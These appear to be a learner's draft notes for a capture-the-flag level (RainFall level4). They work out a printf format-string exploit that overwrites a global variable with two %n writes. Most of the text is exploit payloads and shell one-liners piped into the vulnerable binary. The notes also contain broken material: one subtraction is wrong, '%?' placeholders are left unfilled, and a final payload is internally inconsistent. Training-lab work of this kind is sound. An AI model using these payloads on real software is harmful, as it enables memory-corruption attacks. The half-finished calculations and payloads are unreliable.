We see that we have a format string exploit that is vulnerable

However, the value to write to m, the global variable, is `16930116`. This is way bigger than the size of our buffer

Also, printf is called in a function p, which is another scope than where your buffer is located

First let's get the address of m

```console
level4@RainFall:~$ readelf -s level4 | grep m
66: 08049810     4 OBJECT  GLOBAL DEFAULT   25 m
```

Address of m: `0x08049810` = `\x10\x98\x04\x08`
Address of m + 2: `0x08049810 + 2` = `0x08049812` = `\x12\x98\x04\x08`

## How to write `16930116` at m ??

value to write in m: `16930116` = `0x01025544`

Lets do 2 writes!

value 1: `0x0000 5544` = `21828` at `m`
value 2: `0x0001 0102` = `258` at `m + 2`

YYYY YYY1 | 0102 5544 | ZZZZ ZZZZ

10102

21828 - 8 = 21820
258 - 21828 = 50121

address + adress + 2

`%.$value.`: put nb of paddings (whitespace) equal to value

%12?
6 ?

```
(python -c 'print ("\x10\x98\x04\x08" + "AAAAAAA" + "%12$n")'; cat) | ./level4
```

\x10\x98\x04\x08%42d%12$n

```python
exploit = ""
exploit += "\x10\x98\x04\x08"	//cible 1
exploit += "\x12\x98\x04\x08"	//cible 2
exploit += "%?$21820x"			//padding to get to value 1 (21828 - 8 = 21820)
exploit += "%?$n"				//write cible 1
exploit += "%?$43966x"			//paddding to get to value 2 (65794 - 21820 - 8 = 43966)
exploit += "%? + 1 $n"			//write cible2
```

`\x10\x98\x04\x08\x12\x98\x04\x08%12$n%12$21820x%12$n%12$43966x%13$n`

```bash
(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
```

(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")';) | ./level4

```bash
(python -c 'print ("A" * 8 + "%12$s")'; cat) | ./level4
```

\x10\x98\x04\x08%10$n
